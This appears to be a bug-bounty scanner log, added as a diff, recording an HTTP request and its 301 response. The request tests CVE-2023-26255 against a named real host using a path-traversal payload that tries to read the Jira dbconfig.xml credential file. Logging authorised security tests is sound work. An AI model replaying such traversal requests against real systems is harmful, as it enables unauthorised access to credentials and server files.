@@ -1,0 +1,26 @@
+[CVE-2023-26255] Dumped HTTP request for https://techsolutions.bitpanda.com/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime
+
+
+GET /plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2023-26255] Dumped HTTP response https://techsolutions.bitpanda.com/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Date: Tue, 05 Aug 2025 12:53:22 GMT
+Location: ./snjCustomDesignConfig/?fileName=../dbconfig.xmlpasswd&fileMime=$textMime
+Via: 1.1 472d0d56eebf04200b994d89c556bce0.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: YOWcQA38WLmlYhkRlb8vfIFDZaqbv5rLA68bz1aYB6HIImD5qIBAwg==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+Content-Length: 0
+
+
